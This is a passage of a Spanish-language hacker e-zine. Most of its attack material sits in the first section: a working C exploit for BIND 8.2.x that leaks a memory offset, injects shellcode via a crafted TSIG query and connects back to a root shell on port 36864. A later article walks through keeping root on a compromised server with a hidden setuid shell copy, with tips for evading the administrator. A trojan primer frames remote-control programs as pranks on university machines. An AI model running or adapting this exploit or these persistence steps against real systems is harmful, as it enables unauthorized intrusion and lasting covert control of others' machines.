if(isprint((unsigned char)buff[x]))
line[x%16]=buff[x];
else
line[x%16]='.';
}
printf("\n");
}

void
runshell(int sockd)
{
    char buff[1024];
    int fmax, ret;
    fd_set fds;

    fmax = max(fileno(stdin), sockd) + 1;
    send(sockd, "uname -a; id;\n", 15, 0);

    for(;;)
    {

        FD_ZERO(&fds);
        FD_SET(fileno(stdin), &fds);
        FD_SET(sockd, &fds);

        if(select(fmax, &fds, NULL, NULL, NULL) < 0)
        {
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(sockd, &fds))
        {
            bzero(buff, sizeof buff);
            if((ret = recv(sockd, buff, sizeof buff,
0)) < 0)
            {
                exit(EXIT_FAILURE);
            }
            if(!ret)
            {
                fprintf(stderr, "Conexion cerrada\n");
                exit(EXIT_FAILURE);
            }
            write(fileno(stdout), buff, ret);
        }

        if(FD_ISSET(fileno(stdin), &fds))
        {
            bzero(buff, sizeof buff);
            ret = read(fileno(stdin), buff, sizeof
buff);
            if(send(sockd, buff, ret, 0) != ret)
            {
                fprintf(stderr, "Transmision
Perdida"\n");
                exit(EXIT_FAILURE);
            }
        }
    }
}


connection(struct sockaddr_in host)
{
int sockd;

host.sin_port = htons(36864);

printf("[*] conectando..\n");
usleep(2000);

if((sockd = socket(AF_INET, SOCK_STREAM,
IPPROTO_TCP)) < 0)
{
exit(EXIT_FAILURE);
}

if(connect(sockd, (struct sockaddr *) &host, sizeof
host) != -1)
{
printf("[*] espere a la shell..\n");
usleep(500);
        runshell(sockd);
}
else
{
printf("[x] error: no vulnerable o no se uso el
Offset correcto\n");
}

close(sockd);
}




int infoleak_qry(char* buff)
{
        HEADER* hdr;
        int n, k;
        char* ptr;
        int qry_space = 12;
        int dummy_names = 7;
        int evil_size = 0xff;

        memset(buff, 0, BUFFSIZE);
        hdr = (HEADER*)buff;

        hdr->id = htons(0xbeef);
        hdr->opcode  = IQUERY;
        hdr->rd      = 1;
        hdr->ra      = 1;
        hdr->qdcount = htons(0);
        hdr->nscount = htons(0);
        hdr->ancount = htons(1);
        hdr->arcount = htons(0);


ptr = buff + sizeof(HEADER);
printf("[d] la cabecera es %d de larga\n",
sizeof(HEADER));

n = 62;

for(k=0; k < dummy_names; k++)
{
*ptr++ = n;
ptr += n;
}
ptr += 1;

        PUTSHORT(1/*ns_t_a*/, ptr);              /*
type */
        PUTSHORT(T_A, ptr);                      /*
class */
        PUTLONG(1, ptr);                /* ttl */

PUTSHORT(evil_size, ptr); 
return(ptr - buff + qry_space);

}



int evil_query(char* buff, int offset)
{
int lameaddr, shelladdr, rroffsetidx, rrshellidx,
deplshellcode, offset0;
HEADER* hdr;
char *ptr;
int k, bufflen;
u_int n, m;
u_short s;
int i;
int shelloff, shellstarted, shelldone;
int towrite, ourpack;
int n_dummy_rrs = 7;

printf("[d] evil_query(buff, %08x)\n", offset);
printf("[d] shellcode is %d long\n",
sizeof(shellcode));

shelladdr = offset - 0x200;

        lameaddr  = shelladdr + 0x300;

ourpack = offset - 0x250 + 2;
towrite = (offset & ~0xff) - ourpack - 6;
printf("[d] olb = %d\n", (unsigned char) (offset &
0xff));

rroffsetidx = towrite / 70;
offset0 = towrite - rroffsetidx * 70;

if ((offset0 > 52) || (rroffsetidx > 6))
{
printf("[x] could not write our data in buffer
(offset0=%d, rroffsetidx=%d)\n", offset0,
rroffsetidx);
return(-1);
}

rrshellidx = 1;
deplshellcode = 2;

hdr = (HEADER*)buff;

memset(buff, 0, BUFFSIZE);

/* completado de cabecera */

hdr->id = htons(0xdead);
hdr->opcode  = QUERY;
hdr->rd      = 1;
hdr->ra      = 1;
hdr->qdcount = htons(n_dummy_rrs);
hdr->ancount = htons(0);
hdr->arcount = htons(1);

ptr = buff + sizeof(HEADER);

shellstarted = 0;
shelldone = 0;
shelloff = 0;

n = 63;
for (k = 0; k < n_dummy_rrs; k++)
{
*ptr++ = (char)n;

for(i = 0; i < n-2; i++)
{
if((k == rrshellidx) && (i == deplshellcode) &&
!shellstarted)
{
printf("[*] injectando el codigo shell en %d\n",
k);
shellstarted = 1;
}

if ((k == rroffsetidx) && (i == offset0))
{
*ptr++ = lameaddr & 0x000000ff;
*ptr++ = (lameaddr & 0x0000ff00) >> 8;
*ptr++ = (lameaddr & 0x00ff0000) >> 16;
*ptr++ = (lameaddr & 0xff000000) >> 24;
*ptr++ = shelladdr & 0x000000ff;
*ptr++ = (shelladdr & 0x0000ff00) >> 8;
*ptr++ = (shelladdr & 0x00ff0000) >> 16;
*ptr++ = (shelladdr & 0xff000000) >> 24;
                                *ptr++ = argevdisp1 &
0x000000ff;
                                *ptr++ = (argevdisp1 &
0x0000ff00) >> 8;
                                *ptr++ = (argevdisp1 &
0x00ff0000) >> 16;
                                *ptr++ = (argevdisp1 &
0xff000000) >> 24;
                                *ptr++ = argevdisp2 &
0x000000ff;
                                *ptr++ = (argevdisp2 &
0x0000ff00) >> 8;
                                *ptr++ = (argevdisp2 &
0x00ff0000) >> 16;
                                *ptr++ = (argevdisp2 &
0xff000000) >> 24;
i += 15;
}
else
{
if (shellstarted && !shelldone)
{
*ptr++ = shellcode[shelloff++]; 
if(shelloff == (sizeof(shellcode)))
shelldone=1;
}
else
{
*ptr++ = i;
}
}
}

*ptr++ = 0xeb;

if (k == 0)
{
*ptr++ = 10;

m = 2;
*ptr++ = (char)m;        // header
ptr += 2;
}
else
{
*ptr++ = 0x07;
}

*ptr++ = 0xc0; /*NS_CMPRSFLGS*/
*ptr++ = 0x00; /*NS_CMPRSFLGS*/

ptr += 4;      /* QTYPE, QCLASS */
}

*ptr++ = 0x00;       /* Empty name */

PUTSHORT(0xfa, ptr); /* Type  TSIG */
PUTSHORT(0xff, ptr); /* Class ANY  */

bufflen = ptr - buff;

// dumpbuf(buff, bufflen);

return(bufflen);
}

long xtract_offset(char* buff, int len)
{
long ret;

ret = *((long*)&buff[0x214]);
argevdisp1 = 0x080d7cd0;
argevdisp2 = *((long*)&buff[0x264]);
printf("[d] argevdisp1 = %08x, argevdisp2 = %08x\n",
argevdisp1, argevdisp2);

// dumpbuf(buff, len);

return(ret);
}




int main(int argc, char* argv[])
{
struct sockaddr_in sa;
int sock;
long address;
char buff[BUFFSIZE];
int len, i;
long offset;
socklen_t reclen;
unsigned char foo[4];

printf("[*] bind 8.2.x (< 8.2.3-REL) exploit, Ix\n");

address = 0;
if (argc < 2)
{
printf("[*] uso : %s host\n", argv[0]);

return(-1);
}

if (!(address = resolve_host(argv[1])))
{
printf("[x] No se encontro la IP\n", argv[1]);
return(-1);
} else {
memcpy(foo, &address, 4);
printf("[*] atacando %s (%d.%d.%d.%d)\n", argv[1],
foo[0], foo[1], foo[2], foo[3]);
}

sa.sin_family = AF_INET;

if (0 > (sock = socket(sa.sin_family, SOCK_DGRAM,
0)))
{
return(-1);
}

sa.sin_family = AF_INET;
sa.sin_port = htons(53);
sa.sin_addr.s_addr= address;


len = infoleak_qry(buff);
printf("[d] infoleak_qry tiene una longitud de %d
\n", len);
len = sendto(sock, buff, len, 0 , (struct sockaddr
*)&sa, sizeof(sa));
if (len < 0)
{
printf("[*] no se pudo enviar el iquery\n");
return(-1);
}

reclen = sizeof(sa);
len = recvfrom(sock, buff, BUFFSIZE, 0, (struct
sockaddr *)&sa, &reclen);
if (len < 0)
{
                printf("[x] no se pudo recibir
respuesta del iquery\n");
                return(-1); 
}
printf("[*] longitud respuesta iquery = %d\n", len);

offset = xtract_offset(buff, len);
printf("[*] Offset recibido = %x\n", offset);


len = evil_query(buff, offset);
if(len < 0){
printf("[x] error enviando paquete tsig\n");
return(0);
}

sendto(sock, buff, len, 0 , (struct sockaddr *)&sa,
sizeof(sa));

if (0 > close(sock))
{
return(-1);
}

connection(sa);

return(0); 
}
--Exploit


Parches:

a) Bajarse el no vulnerable en (BIND9)
<ftp://ftp.isc.org/isc/bind9/> 

b) parches de los existentes en
<ftp://ftp.calderasystems.com/pub/updates/OpenLinux/2.3>
<ftp://ftp.calderasystems.com/pub/updates/OpenLinux/2.3>
<ftp://ftp.calderasystems.com/pub/updates/eDesktop/2.4> 
<ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2001-001.txt.asc>
<http://www.redhat.com/support/errata/RHSA-2001-007.html>





--------------------------------------------------------------------
--------------------------------------------------------------------





[9].Una de troyanos (1ª entrega)
    -Halls-


	Este documento esta dividido en dos entregas: la ke habla de troyanos en general y como funcionan y la ke habla de mi troyano en particular, donde se analiza el codigo fuente y tal.

	Nota: Advierto, pa la gente ke kontrole, ke este documento esta orientado pa gente ke no tiene ni idea, menos la parte del codigo, ke es ya un poco mas avanzada.

	Nota2: Ke siiiii, ke es una mierda de troyano el ke he hecho, ke esta hecho con visual basic, pero en una universidad ke tiene ordenatas en red es suficiente y de sobra pa echarte unas risas...

By haLLs.
Int80h - http://www.int80h.net


- ENTREGA 1 -


	1.- De ke ostias estamos hablando?

	Amos a ver... ante todo vamos a aclarar esto de troyano porke esta bastante mal utilizado. Un troyano no es mas que un programa o un simple trozo de codigo escondido en otro programa principal que efectua una accion no prevista por el usuario. Por poner un ejemplo al azar, imaginemos un sistema operativo que funciona mal pero ke se vende mucho. La compañía ke lo programa, le mete un fragmento de codigo ke detecta cuando un usuario se ha conectado a internet, y entonces manda un mensaje a la compañía diciendole ke numero de serie tiene el sistema operativo en cuestion, pa ver si es pirata o no... ese sun ejemplo de troyano.

	Ponemos otro, mas comun. Un tio ke le da un puntazo y hace un programa ke kuenta los numeros pares ke hay de 0 a 50000000, y guarda la lista en un fichero. Pues ahora va el tio y con un programa para juntar ejecutables coge y junta su programa con la calculadora de windoze. Ya tienes un troyano. Ke pasa, ke kuando ejecutas la kalku primero se ejecuta el programa cuentanumeros ese, pero tu no lo tenias previsto, porke tu lo ke has ejecutado es la kalku. Eso es un troyano.

	Ke es lo ke pasa? Ke se ha puesto de moda llamar troyanos a programas de administracion remota (lease Bo, NetBus, Aladino, rmtsysad... xDD), porke generalmente (practicamente siempre) se suelen distribuir dentro de otro programa. Y eso.

	En este documento, voy a explicar como fona y tal el ke me curre yo, el programa de administracion remota ke me curre...

	Nota: Todo lo ke hablemos de redes en este documento sera sobre el protocolo TCP, a menos ke se diga lo contrario.


	2.- Pero entonces, ke koño es un programa de administracion remota?

	Vale. Como su propio nombre indica son programas para administrar (manejar) ordenadores desde otro ordenador. Se suelen utilizar por ejemplo en compañias ke trabajan con ordenadores, por ejemplo, una compañía de cuatro edificios, tiene unos trabajadores que lo unico ke saben de ordenadores es manejar el programa de contabilidad, y de repente se les jode algo. En vez de venir un tio de otro edificio a arreglarlo, con el programa de administracion remota ke tiene instalado, el tecnico se conecta y le arregla el problema. Es mas, depende de lo bueno ke sea el programa el tecnico puede tener control absoluto sobre la makina del trabajador.

	Ahora klaro, llevalo al "lado oscuro". Una universidad en la ke se necesitan los ordenadores pa trabajar en red. Unos tios han instalado unos programillas de administracion remota en los ordenatas de la uni. Ahora, en la clase de informatica pueden conectarse a esos ordenatas y controlar lo ke hace el otro, es decir, echarse unas risas y tal.


	3.- Ya, ya, ya... Y como funcionan?

	Bueno, antes de nada, ahora toca un pokillo de txapa teorica basica sobre redes, pero ke muy basica, no voy a profundizar mucho.

	Cuando vamos a hablar de redes y troyanos, tenemos ke imaginarnos ke el ordenador tiene 65535 enchufes pa conectarse a la red, numerados desde el 1 hasta el 65535. En principio esos enchufes no tienen nada enchufado estan libres, estan sin uso, es decir, estan cerrados. Esos son los ke en realidad se llaman puertos del ordenador. Un puerto sirve para mantener una conexión con otro ordenador. Por ejemplo, cuando estamos viendo una pagina web lo ke en realidad estamos haciendo es mantener una conexión con un servidor y recogiendo la pagina de su servidor. Para ello nuestro navegador lo ke hace es lo ke se llama establecer una conexión, coge un puerto aleatorio (enchufe) en nuestro ordenata, por ejemplo el 1035, y trate de conectarse a la makina ke le hemos pedido (la direccion web) por el puerto del servicio ke keremos solicitar (en el caso de paginas web ese puerto es el 80). Cuando nos keremos conectar a una makina, necesitamos ke esta ofrezca algun servicio, es decir, ke tenga algun puerto abierto. Pero klaro, una makina no tiene un puerto abierto sin mas, para tener un puerto abierto necesita un programa ke lo haga. En el caso de los servidores web, lo ke tienen es un programa ke abre el puerto 80, espera al cliente (el ordenador ke se conecta a ellos pidiendo la page), y cuando un cliente se conecta le dan la pagina ke pide.



	Pero claro, eso pasa tambien con los ftps, con el pop3, smtp, finger, etc... Por ejemplo cuando miramos el correo (ke no sea por web), lo ke hacemos en realidad es conectarnos a una makina ke tiene un programa ke nos da el correo, y para ello nos conectamos por el puerto 110 (generalmente). Si en kambio lo ke keremos es mandar e-mails nos conectamos por el 25. Si keremos conectarnos a un ftp por el 21, etc...

	Y ke tienen ke ver los mal llamados troyanos aki? Bien, pues hacen lo mismo ke kualkier programa de ahí arriba. Lo ke hacen es abrir un puerto en el ordenador de la "victima" y esperan una conexión. Cuando el cliente se conecta (en este caso seria el ke ha distribuido el troyano, o alguien con ganas de risas) lo ke hace es pedir una conexión al ordenador de la victima por el puerto en el ke escucha el troyano. Una vez conectado, el cliente manda comandos ke el programa troyano reconoce y los ejecuta, como por ejemplo mostrar mensajes en la pantalla, mover el raton, y tantas cosas mas...


	4.- Wapo, y como se establece una conexión?

	Hay un programa en windoze ke se llama telnet.exe, ke sirve para conectarte a ekipos remotos. Tu tan solo ties ke decirle ke ekipo kieres y por ke puerto te conectas.

	Cuando te intentas conectar, pueden pasar dos cosas: ke te konectes o no... es facil. Si te conectas, wapo. Pero si no te conectas puede ser por varias cosas. La razon mas comun suele ser ke el puerto este cerrado. Vamos a imaginarnos los puertos del ordenata como enchufes, como hemos dicho antes. Si estan abiertos, es ke tienen un programa asociado a ellos, por lo kual, si te konektas estas utilizando un programa de la makina remota, es decir, ke siempre hay un programa abriendo un puerto, no puede estar el puerto abierto por ke si. Si no te konektas, obviamente es ke no hay asociado un programa a ese puerto,  por tanto esa makina no ofrece servicios por ese puerto.

	En el caso de los troyanos, como hemos dicho antes, es el troyano el programa ke esta asociado al puerto, es el kien te lo abre. Puede ser ke un troyano te abra mas de un puerto, dependiendo de sus necesidades.

	Pongamos por ejemplo el mio, el ke vamos a estudiar luego. Cuando se ejecuta abre el puerto 2345 de la victima, pero a lo largo de su uso, tambien abre el 294 para transferencia de ficheros o el 23456 para loggeo de teclas, según le diga el cliente.

	Luego esta el hecho de usar GUI. El GUI (Graphical User Interface) es un programa especifico hecho para cada troyano. Al principio mi troyano no tenia GUI, se manejaba desde el telnet, pero mas adelante le pues un GUI, porke con el telnet no podia transferir ficheros. Practicamente todos los troyanos ahora tienen GUI (NetBus, BO/BO2k, Aladino, rmtsysad, subseven, satan, ...). 

	Las ventajas de tener un GUI es ke puedes hacer cosas ke no puedes hacer con el telnet. Con el telnet, como es un programa generico de conexión, solo se puede mandar textos, es decir, comandos al troyano, pero no se pueden recibir ficheros por ejemplo. Por eso se usan los GUIs, basicamente, para transferir ficheros, para codificar los datos entre cliente-victima,... y ademas muchas veces dan una gran manejabilidad, con mucha sencillez ya ke es un entorno grafico, ke no es escribiendo los comandos, sino pulsando botones.

	Nota: Tu propia makina tiene komo IP 127.0.0.1 siempre, y se llama "localhost". Pero puedes saber eso escribiendo ipconfig -all en la linea de comandos.




--------------------------------------------------------------------
--------------------------------------------------------------------





[10].La Web del Mes
     -k@in-

La web de este mes es http://www.cyberarmy.com

Es una página web dedicada al mundo del hacker con muchas herramientas y utilidades para el manejo de redes, accesos, etc... Esta bien estructurada, pero tiene el inconveniente del idioma, esta enteramente escrita y tratada en inglés asi que cogete un traductor o apuntate a una escuela de esas que están de moda. No obstante esta página tiene una novedad bastante buena y con la que puedes ser el protagonista hacker de una autentica película de espionaje informático (Zebulum). En general la web esta bastante bien, sin embargo eso del portal y del merchandise....bueno eso ya es cosa de cada uno, ya sabeis a lo que me refiero, a lo de convertir una web de información en un negocio.....

Contenido de las secciones de la web:
- Zeb: En esta sección es donde se incluye el interfaz del hacker que es la principal novedad de esta web y está bastante bien. Para acceder a él tienes que registrarte únicamente dando tu login y tu email. Te mandaran un email con tu password y con eso puedes acceder al ZEBULUM. En principio es una especie de servidor al que puedes someter a todo tipos de ataques hackers. Al acceder nos aparece una pantalla que nos adentra en una autentica misión de espionaje informatico y la cual nos informara de lo que debemos conseguir en la misión para pasar a la siguiente e ir ascendiendo de rango. Hay nueve niveles de rangos, cada vez que consigas realizar una serie de misiones ascenderas de rango y obtendras una serie de permisos especiales en el servidor Zebulum.
Esto es una gran novedad y puede ser muy instructivo y sobre todo divertido.

- Portal: Es simplemente el portal de la web donde puedes encontrar links, downloads, noticias... perosnalmente creo que este link sobra ya que estas opciones están también disponibles individualmente en las siguientes secciones, pero siempre hay que meter un poquito de publicidad (un poco de dinerito con la web no viene mal).

- Srch: Este enlace nos llebara a la sección download. Es bastante completa pero no son enlaces directos sino que son enlaces a otras webs que contienen las aplicaciones, es un poco incomodo pero es la única manera de abarcarlo todo, mediante la unidad. Lo más importante es que hay aplicaciones para muchos sistemas operativos como Mac, Novell, Unix y Windows. También hay una sección llamada "File Needs" dedicada a esos malditos archivos que nos suelen faltar y que no se suelen instalar con los sistemas operativos. En cuanto a las aplicaciones hay de todo, AOL, fire walls, bombers, icq, irc, nucking...

- Links: Esta sección es muy completa, contiene lista de proxis, Wingates (telnet), cuentas de internet, libros para direcciones de correo y almacenamiento de webs. En todos ellos además puedes dejar datos si es que no están incluidos ya.

- Forum: Es el foro de discusión del hacking, con el incoveniente de que es todo en inglés.

En todas las páginas al final de todo nos ira acompañando una sección muy completa que contiene un enlace para escuchar una emisora de radio en la cual se habla de todo esto, nos aparece los temas que trataran en ella. También se proponen misiones para realizar en el Zebulum. Una sección para relizar una votación de temas propuestos y por último unos pocos enlaces con las mejores webs, emails y webs gratis, un poco de texto del webmaster y un poco de teoría. Pero es que además hay un merchandise por si nos ha dado muy fuerte por eso y nos apetece comprarnos una camiseta o un vaso para beberte una cervecita.





--------------------------------------------------------------------
--------------------------------------------------------------------





[11].Preservando el sistema (Set uid shell)
    -BodyBoy-


	Este texto requiere unos minimos conocimientos de linux.. (no hace falta ser un guru para hacer Set uid shell x'D) 
	Hay muchas formas de preservar un sistema una vez obtenidos privilegios de root mediante xploits, bugs, decodes.. o lo que sea =)
Una de ellas es esta: "Set uid shell" aunque tambien se puede optar por troyanos, backdoors, sniffers.. etc

	¿Por que Set uid shell? x'D 
	Pues aunque son facilmente detectables con un "find / -perm +400 -exec ls -l {} \;" son muy simples de hacer :) antes de empezar.. no seria mala idea comprobar si el root busca set uid shell's en su sistema periodicamente ejecutando un "cat /root/.bash_history", tambien es una forma de conocer un poco mas al root y su forma de administrar el sistema.. que siempre puede ayudar a que no nos pillen =)

	¿En que consiste el Set uid shell?
	Consiste en copiar una shell (/bin/bash, /bin/sh, /bin/zsh, /bin/bsh.. etc) cambiar el propietario como root y el grupo, añadirle los permisos necesarios para que todo aquel que ejecute esa shell obtenga los privilegios del propietario de la misma.. en este caso el root :) De esta forma obtendremos privilegios de root solo con ejecutar la shell.. 
	
	Y os preguntareis.. ¿Para que me sirve Set uid shell, si ya tengo un xploit que me da privilegios de root? hehehe.. Pues imaginate que un dia el root parchea el sistema.. i tu 
xploit deja de funcionar :( o que una vez echo el set uid shell quieres parchear el sistema tu mismo para que ningun listillo pille root en esa maquina aprovechandose del bug con el que tu obtuviste privilegios de root..


Vamos con una demostracion:
 
[root@cm08351 /root]# telnet 206.99.217.47 23
Trying 206.99.217.47...
Connected to 206.99.217.47.
Escape character is '^]'.
WinGate>victima.puina.com
Connecting to host victima.puina.com...Connected

Red Hat Linux release 6.2 (Zoot)
Kernel 2.2.14-5.0 on an i686
login: body
Password:
[body@mailsrv .body]$ id
uid=586(body) gid=586(body) groups=586(body
[body@mailsrv .body]$ whoami
body
[body@mailsrv .body]$ cd /tmp
[body@mailsrv /tmp]$ ls
ext2fs       xploit         orbit-root    pinerc003199  pinerc031531
kfm-cache-0  orbit-oracle  orbit-sybase  pinerc024746  tksysv-backup
[body@mailsrv /tmp]$ ./xploit
bash# id
uid=0(root) gid=0(root) groups=586(body)
bash# whoami
root
bash# cp /bin/bash /home/.body
bash# cd /home/.body
bash# ls
Desktop  bash
bash# mv bash .suid
bash# ls
Desktop
bash# ls -al .suid
-rwxr-xr-x    1 root     root       316848 Feb  4 20:30 .suid
bash# chmod 4755 .noise
bash# ls -al .suid
-rwsr-xr-x    1 root     root       316848 Feb  4 20:30 .suid
bash# exit
exit
[body@mailsrv .body]$ id
uid=586(body) gid=586(body) groups=586(body)
[body@mailsrv .body]$ ls
Desktop
[body@mailsrv .body]$ ./.suid
[body@mailsrv .body]# whoami
root
[body@mailsrv .body]# id
uid=586(body) gid=586(body) euid=0(root) groups=586(body)
[body@mailsrv .body]# exit


Si al hacer el "ls -al .suid" nos saliera:
rwsr-xr-x    1 root     body       316848 Feb  4 20:30 .suid
Sería aconsejable cambiar el grupo para no levantar sospechas con:
chgrp root .suid

Al haber copiado la shell como root nos sale como propietario el root y como el xploit que ejecutamos en el ejemplo nos daba "guid=0" tambien nos sale el grupo del root :) 

Bueno.. lo que hemos echo ha sido copiar una shell en este caso /bin/bash a nuestro home, la hemos renombrado a .suid (el "." hace que el archivo este oculto), luego le hemos dado los permisos 4755. Los permisos 755 daran permiso de lectura, escritura y ejecucion al propietario y de lectura y ejecucion a usuarios del mismo grupo y al resto de los usuarios.El atributo 4 delante activara el bit Setuid. Este bit estara representado y activado en los permisos del 
usuario del programa y actuara como si fuese ejecutado por el propio dueño del fichero.
	Recordar que cualquier usuario tiene permiso para ejecutar ".suid" asi que os aconsejo que lo escondais.. :) por ejemplo en /usr/bin para que pase un poco mas desapercibido..

	Espero que os sea de utilidad a los que no conocierais el "Set uid shell" (tambien llamados sushi, suid.. etc) hay varias formas de hacer Set uid shell, he puesto esta por que es la que mas me gusta :P incluso hasta se puede hacer Set guid shell.. pero eso otro dia x')aleeeee despedida i cierre xDD

	Dudas, reclamaciones, insultos, donaciones, sugerencias, fallos... para lo que sea mandame un mail a bodyboy@marihuana.com :) tambien podeis encontrarme en el canal #Hackspain del IRC-Hispano.  



GREETS TO

MaNiaK: Gracias por ser un jeiman x´D
Ripe: Gracias por revisar el txt y corregir ese par de fallos x´D

Happy Hack 0}:)





--------------------------------------------------------------------
--------------------------------------------------------------------





[12].IRC BOTS Intoduccion y configuracion de un darkbot
    -MaLiGnO-

	Wen0 aqui estmos de nuevo, con este mini articulo por que el time no me lo a permitido vamos a intentar instalar un BOT en IRC basandonos en DarkBot , un bot bastante bueno y facil de configurar en mi opinion.

	Lo Primero que nada debemos saber que un BOT es un programa que , como un usuario , se conecta a un server de IRC y cumple funciones que le son asignadas por su master o sea quien lo instala. Por ejem en todos aquellos servidores en que no se pueden registrar canales , el bot nos ayudaria a darle op a nuestros amigos y asi mantener el canal mas o menos administrad0 ya que no desapareceria  porque el bot esta conectado todo el dia al servidor de irc.

	Ademas de cumplir funciones de operador el bot puede responder a instrucciones o palabras claves enviadas por su master o por un simple usuario.

Por ejemplo:

<USER> ?? uci
<BOT> uci f0r3w4 !!!!

	Como se puede observar el BOT responde a palabras claves que han sido dichas por quienes lo administran.
    Bueno ahora empezemos con el BoT que explicare.

	
	DarkBOT es un bot escrito en C por Jason Hamilton 
< jason@superlink.net > .

	Su funcion es, ademas de dar op o voice a sus users ,el de ser un bot de ayuda ya que responde a palabras o frases claves designadas por el master del bot.
	Lo podemos bajar de www.superchat.org/darkbot la cual es su page oficial o bien en www.freshmeat.net en donde si haces una busqueda de bots encontraras muchos mas.
	Lo Bueno de los bots ,como ya esta dicho,es que estan todo el dia conectados al servidor de irc.Para lograr esto los bots deben estar cargados en un servidor ya que estas son maquinas que estan conectadas todo el dia (os imaginais un bot todo el dia puesto en vuestra maquina pequeña factura a los puin0s que no tienen tarifa plana :P) por lo tanto sirven para lograr ese objetivo,asi que primero que nada debemos tener una shell en un servidor (si es Linux mejor , aunque tb  hay versiones de BOTS para windows,DarkBOT es un ejem) y desde ahi lanzaremos nuestro bot al irc,claro que cuando lo ejecutemos por primera vez es convenientemente lanzarlo desde nuestra propia maquina para asi mirar lo fallos que pueda tener mas adelante ;P (es broma)

	Supongamos que ya tenemos shell en un servidor y tenemos el tar.gz del bot bueno lo subimos y compilamos arriba,en el caso de DarkBOT seria algo asi mas o menos:


[uninet@puin0s/]# tar zxvf darkbot.tar.gz


y se instalara en el directorio darkbot5f22.bf.Entramos a este directorio y ejecutamos el script configure con la orden ./configure 


----------------------------------------------------
Welcome to Darkbot v5 configuration, ....
This will lead you through the setup of your darkbot

The configuration will take a few minutes, and
will require you to answer questions... so don't
go anywhere!
----------------------------------------------------

Enter the name if the text editor you would like to use [pico]:

Pos aqui metemos el nombre binario de nuestro editor de textos
favorito (en modo texto claro).Podemos usar vim, vi , emacs, joe, pico, etc... yo uso vi pero para gustos colores o si no que se lo digan a body y sus emech. En fin body salud0s puin0 ... tendra sus razones digo yo.Despues de meter el nombre del programa veremos esto:

You will need to build the setup.ini for Darkbot...

Hit ENTER to continue.

Cae de cajon pulsamos enter.

Enter the nickname you would like to use for your bot:

Aqui metemos el nick que usara el bot si el nick esta reguistrado o no  eso ia es cosa vuestra ,da lo mismo luego vemos como dar la pass a nickserv nuestro bot se llamara MaNoLiN

Enter the userid you would like to use .....

Aqui no piden que pongamos el ident que tendra el bot (user para los mas avanzados :P, se refiere a lo que sale antes del @ cuando se le hace un whois) el user que sale entre [] es el usuario de la cuenta shell que estamos usando,pero podemos poner el user que queramos :D ... en nuestro caso sera MaNoLiN

Enter the channel MaNoLiN join:

el canal donde entraremos...para nosotros sera #uci

Enter the realname info for MaNOLiN [default]:

el realname es lo que sale despues del host en el whois,podemos poner una frase o una palabra,da lo mismo que da =

Enter the command character MaNoLiN should respond to [!]:
No CMDCHAR specified, defaulting to !

Aqui debemos poner cual sera el caracter que indicara al bot que debe
responder a un request. Si damos enter sera seleccionado el caracter que viene por defecto ,osea te lo jur0!  :P

Enter the VHOST you want to use. If none, hit enter [0]:
None entered. Will not use VHOST.

Aqui indicamos el VHOST (virtual host) :P,si damos enter no usara
virtualhost.

Writing data settings to setup.ini .....

...escribiendo datos al archivo setup.ini...

Okay, now you will need to update the #define settings
in darkbot.c ... near the top are a few #defines marked
that you need to change (if needed).

Hit ENTER to continue.

Aqui debemos cambiar algunas opciones del codigo del bot,por ejemplo la respuesta a los CTCP VERSION,el idioma que usara el bot,algunas respuestas que vienen por defecto,etc.Por ejemplo,cambiemos la respuesta al CTCP VERSION :

#define VERSION_REPLY "MaNoLiN BOT de Servicios a la drogadiccion"

asi deberia verse nuestro VERSION_REPLY si queremos que nuestro bot envie esta respuesta ante las peticiones de VERSION de cliente irc.Si queremos cambiar el idioma que usara el bot modificamos la linea

#define LANG 1

por

#define LANG 3

el 1 corresponde al ingles y el 3 a español, el español las lleva :D .
    Una vez hayamos hecho los cambios que queriamos al codigo del bot,nos ponemos a guardar los cambios y salir del editor de texto para continuar la instalacion.
   
Next you need to specify the server MaNoLiN should connect to.

Enter the server your bot should connect to [irc.superchat.org]:

	Aqui ponemos el servidor al que deseamos que el bot se conecte, pongamos:
irc.telecable.es ;P

Enter the port to connect to on irc.telecable.es [6667]:

y aqui ponemos el puerto del servidor,en el caso de telecable es 6667
que es en donde generalmente estan los  ircd.

Darkbot configuration menu -

1) Read the README files	(recommended)
2) Setup the .ini files		(recommended)
3) Setup your userlist		(required)
4) Add another server		(recommended)
5) Quit configuration		(Hope you *eventually* select this ;)

   Luego nos aparecera este menu donde se termina de configurar,pero
hasta el proximo numero nada no me a dado time a terminar el articulo por ese s0b que mete tanta caña weno hasta uci 3 ;P vamos creciendo

Agradecimientos:

 s0b: no metas tanta caña ;P
 BoDyBoY: tus emech sux Galleta
 Maniak: por Puin0 xDDDDD





--------------------------------------------------------------------
--------------------------------------------------------------------





[13].Cartas a UCI


							-S0b-


	Ante todo daros las gracias a todos los que nos habéis escrito dandonos ánimo y tb aportandonos críticas constructivas :)

	Bien, como UCI2 debería haber salido ya (como siempre andamos con retraso) pues vamos a contestar solo unos pocos mails de todos los recibidos. Sin embargo prometemos k para UCI3 responderemos a toooodoooo lo ke nos envieis (bueno, por lo menos lo intentaremos)

	Weno, vamos a lo ke vamos...


=================================================================
=================================================================
=================================================================


****@********@********@****
me ha gustado mucho la Uci 1 y quisiera preguntarles como hacer para desencriptar una clave de un mail
mi nombre es Jose antonio y mi mail
jasiz@yahoo.com
****@********@********@****
Pues verás, no se a que te refieres con desencriptar la clave de un mail ¿te refieres a pgp? ¿a sacar el password de alguien? ¿a convertir los *** de tu outlook a letras xD ?

Sobre pgp tienes mil artículos y explicaciones por ahi, pero bueno, a ver si para UCI3 escribimos un mini manual de como usarlo

Sobre lo de sacar los passwords de alguien, a no ser k seas más específico, no comments :)

Sobre lo de pasar los *** del win a caractéres legibles hay unos cuantos programillas por ahi ke lo hacen. Puedes visitar www.vanhackez.com y bajar el programa openpass.exe k es sencillo pero bastante útil para esto.

=================================================================
=================================================================
=================================================================


****@********@********@****
Congratulations!  http://uciweb.cjb.net has been successfully created.

For future reference, your username and password are listed below.  Do not lose this information -- you will need it to make future modifications to your account.
****@********@********@****

Pos weno, eso significa k tenemos nueva url ( es una redirección a la misma de antes pero k la hará más fácil de recordar ;) )


=================================================================
=================================================================
=================================================================

****@********@********@****
Holaxxxxxxxxxxxxx
Primero me gustaria felicitarlos por iniciar esta proyecto undergound por 
que si exta de pelox por
lo que me veo obligado a pedirles que se esfuercen y que no le paren ok???
tambien me gustaria incluir unos comentarios sobre los temas que mas me 
gustaron de todo el el
Nº 1 de UCI.

[3].Saltarse passwords con javascript.
   -Sob-

Exelente solución para saltarte los passwords con javascript. Nunca se me 
